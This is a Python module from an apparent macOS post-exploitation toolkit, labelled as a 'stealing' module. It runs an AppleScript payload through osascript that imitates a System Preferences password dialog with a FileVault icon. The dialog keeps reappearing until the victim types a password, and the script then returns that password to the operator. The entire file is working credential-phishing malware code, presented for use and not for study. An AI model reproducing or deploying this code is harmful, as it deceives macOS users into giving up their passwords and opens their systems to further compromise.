#!/usr/bin/env python3

from core.badges import badges

class UnicornModule:
    def __init__(self, unicorn):
        self.unicorn = unicorn
        self.badges = badges()
        
        self.name = "prompt"
        self.description = "Prompt user to share password."
        self.usage = "Usage: prompt"
        self.type = "stealing"
        self.args = 1
        
    def run(self, cmd_data):
        payload = """
        tell application "Finder"
            activate
            set myprompt to "Type your password to allow System Preferences to make changes"
                        
            set ans to "Cancel"
            repeat
                try
                    set d_returns to display dialog myprompt default answer "" with hidden answer buttons {"Cancel", "OK"} default button "OK" with icon path to resource "FileVaultIcon.icns" in bundle "/System/Library/CoreServices/CoreTypes.bundle"
                    set ans to button returned of d_returns
                    set mypass to text returned of d_returns
                    if mypass > "" then exit repeat
                end try
            end repeat
                        
            try
                do shell script "echo " & quoted form of mypass
            end try
        end tell
        """
        print(self.badges.I + "User entered: " + self.unicorn.send_command("osascript", payload))
